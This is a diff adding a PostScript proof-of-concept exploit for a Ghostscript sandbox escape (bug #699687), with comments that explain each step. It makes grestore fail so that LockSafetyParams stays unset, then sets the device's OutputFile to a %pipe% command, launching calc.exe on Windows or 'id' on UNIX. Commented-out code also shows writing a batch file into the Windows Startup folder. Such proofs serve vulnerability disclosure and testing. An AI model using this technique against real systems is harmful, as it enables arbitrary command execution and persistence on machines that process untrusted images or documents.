@@ -1,0 +1,81 @@
+%!PS
+% This is ghostscript bug #699687 (split out from bug #699654)
+
+% ImageMagick define setpagedevice, just remove their definition. This doesn't
+% do anything if not using ImageMagick.
+userdict /setpagedevice undef
+
+% function to check if we're on Linux or Windows
+/iswindows {
+    % Just checking if paths contain drive
+    null (w) .tempfile closefile 1 get 16#3A eq
+} def
+
+% just select a papersize to initialize page device
+a0
+
+% The bug is that if you can make grestore or restore fail non-fatally,
+% LockSafetyParams isn't restored properly. grestore will fail if you set crazy
+% properties in your pagedevice, like a nonsense resolution.
+%
+% Normally it would be something like [72.0 72.0], but you can't just def
+% HWResolution to something else (for example), because it's readonly:
+%
+% GS>currentpagedevice wcheck ==
+% false
+%
+% But you can just put or astore into it, because the array itself is writable:
+% GS>currentpagedevice /HWResolution get wcheck ==
+% true
+%
+% Lets just put some junk in there.
+currentpagedevice /HWResolution get 0 (foobar) put
+
+% This grestore will fail, stopped just catches the error instead of aborting.
+{ grestore } stopped pop
+
+% Now LockSafetyParams will be incorrectly unset, you can check like this:
+% GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get == pop
+% false
+
+% We can change and configure devices now, so make sure we're using one with
+% a OutputFile property.
+(ppmraw) selectdevice
+
+% Check if we're on Windows or UNIX
+iswindows {
+    % This is Windows, gswin32c.exe supports %pipe%, so you can just run calc.exe.
+    %
+    % The graphical version doesn't seem to support %pipe%, but you can create
+    % arbitrary files. If something is using the api (gs32dll.dll), it may or
+    % may not support %pipe%.
+
+    /getstartupdirwindows {
+        % This figures out startup location from %TEMP% (Tested on Win10)
+        (C:\\USERS\\XXXXXX~1\\STARTM~1\\PROGRAMS\\STARTUP\\)
+        dup 0 null (w) .tempfile closefile 0 18 getinterval putinterval
+    } def
+
+    % (directory) (extension) randfile (result)
+    /randfile {
+        % pick a random filename
+        exch rand 32 string cvs concatstrings exch concatstrings
+    } def
+
+    mark /OutputFile (%pipe%calc.exe) currentdevice putdeviceprops
+
+    % if you need to create files, use txtwrite like this:
+
+    %mark /OutputFile getstartupdirwindows (.bat) randfile
+    %   { (txtwrite) selectdevice } stopped pop putdeviceprops setdevice
+    %0 0 moveto
+    %(REM This is an exploit demo\n) show
+    %(calc.exe\n) show
+} {
+    % This is UNIX, just run a shell command
+    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+} ifelse
+
+{ showpage } stopped pop
+
+quit
